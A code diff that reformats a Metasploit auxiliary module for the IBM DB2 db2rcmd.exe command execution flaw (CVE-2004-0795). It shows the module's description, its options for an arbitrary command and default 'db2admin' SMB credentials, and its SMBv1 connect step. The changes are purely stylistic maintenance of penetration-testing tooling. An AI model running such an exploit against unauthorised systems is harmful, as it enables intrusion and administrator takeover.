@@ -7,36 +7,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability',
+        'Description' => %q{
           This module exploits a vulnerability in the Remote Command Server
           component in IBM's DB2 Universal Database 8.1. An authenticated
           attacker can send arbitrary commands to the DB2REMOTECMD named pipe
           which could lead to administrator privileges.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        },
+        'Author' => [ 'MC' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2004-0795' ],
           [ 'OSVDB', '4180' ],
           [ 'BID', '9821' ],
         ],
-      'DisclosureDate' => '2004-03-04'))
+        'DisclosureDate' => '2004-03-04'
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('CMD', [ true, 'The command to execute', 'ver']),
-          OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin']),
-          OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'])
-        ])
+    register_options(
+      [
+        OptString.new('CMD', [ true, 'The command to execute', 'ver']),
+        OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin']),
+        OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'])
+      ]
+    )
 
-      deregister_options('SMB::ProtocolVersion')
+    deregister_options('SMB::ProtocolVersion')
   end
 
   def run
-
     print_status("Connecting to the server...")
     connect(versions: [1])
 
@@ -84,6 +87,5 @@ class MetasploitModule < Msf::Auxiliary
     # Close the named pipe and disconnect from the socket.
     pipe.close
     disconnect
-
   end
 end
